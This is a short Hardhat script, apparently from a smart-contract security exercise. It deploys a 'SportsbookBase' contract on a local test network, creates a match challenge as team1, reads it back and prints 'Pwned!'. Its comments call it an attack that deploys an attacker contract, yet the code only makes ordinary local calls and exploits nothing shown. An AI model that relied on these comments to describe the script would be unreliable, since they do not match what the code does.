const { deployments, ethers } = require("hardhat");

async function main() {
  /* Get signer */

  const accounts = await ethers.getSigners();
  const deployer = accounts[0];
  const team1 = accounts[1];
  const team2 = accounts[2];
  const locationProvider = accounts[3];

  /* Attack deploying a new attacker contract */

  console.log("Deploying SportsbookBase contract...");
  await deployments.fixture("base");
  const deployerConnectedContract = await ethers.getContract(
    "SportsbookBase",
    deployer
  );

  /* Running the attack */

  console.log("Creating a Challenge with team1...");
  const team1ConnectedContract = await ethers.getContract(
    "SportsbookBase",
    team1
  );
  const challengeCreation = await team1ConnectedContract.createChallenge(
    team2.address,
    locationProvider.address
  );
  await challengeCreation.wait(1);
  const matchChallenge = await deployerConnectedContract.viewMatchChallenge(0);
  console.log("team1 address is: " + team1.address);
  console.log(matchChallenge);
  console.log("Pwned!");
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
